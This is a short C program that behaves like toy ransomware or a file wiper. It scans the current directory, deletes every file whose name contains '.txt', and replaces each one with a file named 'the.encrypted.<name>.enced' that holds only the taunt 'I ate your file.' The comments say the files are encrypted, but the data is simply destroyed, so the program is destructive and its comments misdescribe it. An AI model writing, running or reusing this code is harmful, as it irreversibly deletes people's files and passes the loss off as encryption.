#include <stdio.h>
#include <dirent.h>
#include <string.h>

int main() {
    DIR *d;
    struct dirent *rs;
    char fear_text[2048];
    strcpy(fear_text, "I ate your file.");

    d = opendir("./");
    while (rs = readdir(d)) {
        char f_name[256];
        strcpy(f_name, rs -> d_name);

        if (strstr(f_name, ".encrypted")) {
            break;
        }

        // Check File Extension And Encrypt File
        if (strstr(f_name, ".txt")) {
            // Defined Required Variables
            FILE *f;
            char new_name[512];

            // Delete Previous File And Reproduce It Into The Encrypted
            remove(f_name);
            sprintf(new_name, "the.encrypted.%s.%s", f_name, "enced");

            // Processing
            f = fopen(new_name, "w");
            fprintf(f, fear_text);
            fclose(f);
        }
    }
    closedir(d);
    return 0;
}
